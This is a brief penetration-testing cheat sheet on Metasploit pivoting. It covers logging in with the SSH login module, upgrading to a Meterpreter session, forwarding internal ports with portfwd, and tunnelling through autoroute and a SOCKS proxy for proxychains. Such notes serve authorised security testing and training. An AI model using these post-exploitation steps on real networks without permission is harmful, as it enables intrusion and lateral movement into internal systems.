# Metasploit

# Usage:

    route add/del IP SUBNET [COMM/SID] (proxy)

    portfwd add/del -l PORT -p PORT -r IP (port forwarding)

## On a Meterpreter session, run:

    run autoroute -s TARGET_SUBNET/MASK

## Port Forwarding with Metasploit

### 1) With SSH login

    use auxiliary/scanner/ssh/ssh_login

    set rhosts RHOSTS

    set username USERNAME

    set password PASSWORD

    exploit

### Upgrade to Meterpreter session. Creates an EXTRA session with meterpreter

    sessions -u 1 

    sessions 2

### Check for applications that run internally within the target

    netstat -antp 

    portfwd add -l LOCAL_PORT -p TARGET_PORT -r 127.0.0.1

## Tunneling with Metasploit

### 1) autoroute (Deprecated)

    sessions

    use post/multi/manage/autoroute

    set session SESSION_NUM

    exploit

    use auxiliary/server/socks5

    set srvhost 127.0.0.1

    exploit

### Then go to web browser in Kali and make the manual proxy configuration settings

## TIP: Instead, we can use proxychains to connect to internal machines in the network

### Same steps apply to socks4a proxy
